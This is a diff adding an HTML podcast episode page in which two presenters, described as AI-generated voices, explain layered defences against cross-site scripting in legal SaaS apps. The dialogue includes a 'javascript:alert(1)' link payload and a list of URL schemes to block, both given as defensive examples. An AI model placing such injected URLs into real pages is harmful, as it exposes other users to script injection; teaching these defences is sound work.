+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Which is exactly why legal tech has elevated XSS risk compared to, say, a calculator app. You need bold, italic, lists, headings, maybe tables. The safe approach is to sanitise with an allowlist. DOMPurify is the industry standard &mdash; it&rsquo;s maintained by cure53, a security research firm, and it&rsquo;s been hardened against hundreds of bypass techniques. You define exactly which HTML tags and attributes are permitted, and everything else is stripped.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> What about document previews? PDFs, Word documents displayed in the browser?</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Massive attack surface. A PDF can contain JavaScript. An HTML email rendered in your app context can include script tags. A DOCX with embedded macros. The key defence is origin isolation. You render untrusted document content in a sandboxed iframe on a different origin &mdash; preview.legalapp.com, not app.legalapp.com. Same-origin policy prevents scripts in that iframe from accessing your main application&rsquo;s cookies, DOM, or APIs. Alternatively, convert documents to images for preview &mdash; that eliminates active content entirely.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> Now, Content Security Policy &mdash; CSP. I hear this mentioned constantly in the context of XSS.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> CSP is a browser-enforced policy that restricts what resources a page can load and execute. The most important directive for XSS is script-src. If you set it to &rsquo;self&rsquo; without &rsquo;unsafe-inline&rsquo; and without &rsquo;unsafe-eval,&rsquo; the browser will refuse to execute any inline script &mdash; even if an attacker successfully injects one into your HTML. The injected script tag is there in the DOM, but the browser says &ldquo;nope, CSP doesn&rsquo;t allow inline scripts&rdquo; and blocks execution.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> That sounds like a complete defence. What&rsquo;s the catch?</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Two catches. First, you have to actually eliminate inline scripts from your own code, which can be a significant refactoring effort for legacy applications. Second, Google research from 2016 found that 94% of deployed CSPs were bypassable &mdash; primarily because developers added &rsquo;unsafe-inline&rsquo; to make their existing code work, which defeats the entire purpose. A CSP with unsafe-inline provides almost no XSS protection.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> So it&rsquo;s only effective if you commit to the refactoring.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Correct. The migration path is: move all inline scripts to external files, then use nonces &mdash; random tokens generated per request that must match between the CSP header and script tags. Only scripts with the correct nonce execute. Attackers can&rsquo;t predict the nonce, so injected scripts are blocked. Deploy in report-only mode first so you can identify violations without breaking functionality.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> What about the href attribute? I&rsquo;ve seen XSS through links.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> JavaScript pseudo-URLs. If user input ends up in an href attribute &mdash; like a &ldquo;source&rdquo; link on a shared document &mdash; and the user supplies javascript:alert(1) &mdash; clicking the link executes JavaScript. Auto-escaping frameworks don&rsquo;t prevent this because it&rsquo;s a valid href value syntactically. You need explicit URL scheme validation: only allow http, https, and mailto. Block javascript:, data:, and vbscript: schemes unconditionally.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> Let me summarise the legal SaaS specific risks. Rich text editors, document previews, email rendering, and any feature that displays user-controlled HTML.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Plus collaborative features. If one user can inject content that another user views &mdash; shared matter notes, annotation layers, comments &mdash; that&rsquo;s a stored XSS surface. Every collaborative feature in your application needs output encoding or sanitisation on the rendering path.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> The defence stack then is: auto-escaping framework as baseline, DOMPurify for rich text, CSP to prevent inline script execution, sandboxed iframes for document previews, HttpOnly cookies so even successful XSS can&rsquo;t steal session tokens directly, and URL scheme validation on all href attributes.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Layers. No single control is sufficient. Auto-escaping has gaps. CSP can be misconfigured. DOMPurify has had bypasses &mdash; rare, but they&rsquo;ve happened. The combination makes exploitation require bypassing multiple independent controls simultaneously.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> Next episode &mdash; File Upload Security. Users upload documents constantly in legal tech. PDFs, Word files, scanned images. What happens when those files aren&rsquo;t what they claim to be?</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Until then, I&rsquo;m Alice.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-ink">Dan:</span> And I&rsquo;m Dan.</p>
+
+        <p class="text-lg leading-relaxed"><span class="font-semibold text-red">Alice:</span> Security for Legal SaaS is a series written with AI assistance. Alice and Dan are AI-generated voices &mdash; no professional advice here, just education.</p>
+
+        <p class="text-lg leading-relaxed text-ink-muted italic mt-8">Security for Legal SaaS is a series written with AI assistance. Alice and Dan are AI-generated voices &mdash; no professional advice here, just education.</p>
+
+    </article>
+</section>
+
+<!-- Sources -->
+<section class="py-12 border-b border-rule">
+    <h2 class="font-sans text-sm tracking-widest uppercase text-ink-muted mb-8">Sources &amp; references</h2>
+    <ol class="list-decimal list-inside space-y-4 text-base text-ink-light leading-relaxed">
+        <li id="fn-1"><a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">OWASP Top 10:2021, "A03 Injection."</a></li>
+        <li id="fn-2"><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">PortSwigger, "Cross-site scripting (XSS)." Comprehensive tutorial</a></li>
+        <li id="fn-3"><a href="https://www.hackerone.com/resources/reporting/top-10-vulnerabilities" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">HackerOne, "Top 10 Most Impactful Vulnerability Categories," 2023</a></li>
+        <li id="fn-4"><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Mozilla Developer Network, "Content Security Policy (CSP)."</a></li>
+        <li id="fn-5"><a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Google, "CSP Evaluator." Online tool for analysing Content Security Policies</a></li>
+        <li id="fn-6"><a href="https://research.google/pubs/pub45542/" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Weichselbaum et al., "CSP Is Dead, Long Live CSP!" Google Research, 2016. Found 94.72% of CSPs bypassable</a></li>
+        <li id="fn-7"><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">OWASP, "Cross-Site Scripting Prevention Cheat Sheet."</a></li>
+        <li id="fn-8"><a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">cure53, "DOMPurify." XSS-safe HTML sanitiser</a></li>
+        <li id="fn-9"><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Mozilla Developer Network, "X-Content-Type-Options."</a></li>
+        <li id="fn-10"><a href="https://portswigger.net/research/breaking-out-of-a-sandboxed-iframe" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">PortSwigger Research, "Breaking out of a sandboxed iframe."</a></li>
+        <li id="fn-11"><a href="https://reactjs.org/docs/introducing-jsx.html#jsx-prevents-injection-attacks" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">React Documentation, "JSX Prevents Injection Attacks."</a></li>
+        <li id="fn-12"><a href="https://en.wikipedia.org/wiki/Samy_(computer_worm)" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Wikipedia, "Samy (computer worm)." First major XSS worm, 2005</a></li>
+        <li id="fn-13"><a href="https://report-uri.com/" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">Report URI, CSP reporting and monitoring service</a></li>
+    </ol>
+</section>
+
+<nav aria-label="Episode navigation" class="py-10">
+    <div class="flex items-center justify-between">
+        <div>
+            <a href="episode-08-sql-injection-and-orm-safety.html" class="group inline-flex items-center text-ink-light hover:text-red transition-colors">
+                <svg class="w-5 h-5 mr-3 text-ink-muted group-hover:text-red transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
+                </svg>
+                <div>
+                    <p class="font-sans text-sm tracking-widest uppercase text-ink-muted">Previous</p>
+                    <p class="text-lg font-semibold">Episode 8 &mdash; SQL Injection and ORM Safety</p>
+                </div>
+            </a>
+        </div>
+        <div class="text-right">
+            <span class="group inline-flex items-center text-ink-muted">
+                <div class="text-right">
+                    <p class="font-sans text-sm tracking-widest uppercase text-ink-muted">Next</p>
+                    <p class="text-lg font-semibold">Episode 10 &mdash; Coming Soon</p>
+                </div>
+                <svg class="w-5 h-5 ml-3 text-ink-muted" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                </svg>
+            </span>
+        </div>
+    </div>
+</nav>
+
+    </main>
+
+    <footer class="border-t-2 border-rule-dark">
+        <div class="max-w-3xl mx-auto px-6 py-8 text-center">
+            <p class="font-sans text-xs text-ink-muted">Security for Legal SaaS &copy; 2026</p>
+        </div>
+    </footer>
+
+    <script src="../assets/js/plyr.js"></script>
+
+<script>
+    const audio = document.getElementById('player');
+    const fill = document.getElementById('progress-fill');
+    const dot = document.getElementById('progress-dot');
+    const bar = document.getElementById('progress-bar');
+    const timeEl = document.getElementById('current-time');
+    const iconPlay = document.getElementById('icon-play');
+    const iconPause = document.getElementById('icon-pause');
+
+    audio.addEventListener('play', function() {
+        iconPlay.classList.add('hidden');
+        iconPause.classList.remove('hidden');
+    });
+    audio.addEventListener('pause', function() {
+        iconPause.classList.add('hidden');
+        iconPlay.classList.remove('hidden');
+    });
+
+    audio.addEventListener('timeupdate', function() {
+        if (dragging) return;
+        const pct = (audio.currentTime / audio.duration * 100) || 0;
+        fill.style.width = pct + '%';
+        dot.style.left = pct + '%';
+        const m = Math.floor(audio.currentTime / 60);
+        const s = Math.floor(audio.currentTime % 60);
+        timeEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+    });
+
+    let dragging = false;
+    function seek(e) {
+        const rect = bar.getBoundingClientRect();
+        const pct = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width));
+        fill.style.width = (pct * 100) + '%';
+        dot.style.left = (pct * 100) + '%';
+        audio.currentTime = pct * audio.duration;
+    }
+    bar.addEventListener('mousedown', function(e) { dragging = true; seek(e); });
+    document.addEventListener('mousemove', function(e) { if (dragging) seek(e); });
+    document.addEventListener('mouseup', function() { dragging = false; });
+    bar.addEventListener('touchstart', function(e) { dragging = true; seek(e.touches[0]); }, {passive: true});
+    document.addEventListener('touchmove', function(e) { if (dragging) seek(e.touches[0]); });
+    document.addEventListener('touchend', function() { dragging = false; });
+</script>
+
+</body>
+</html>
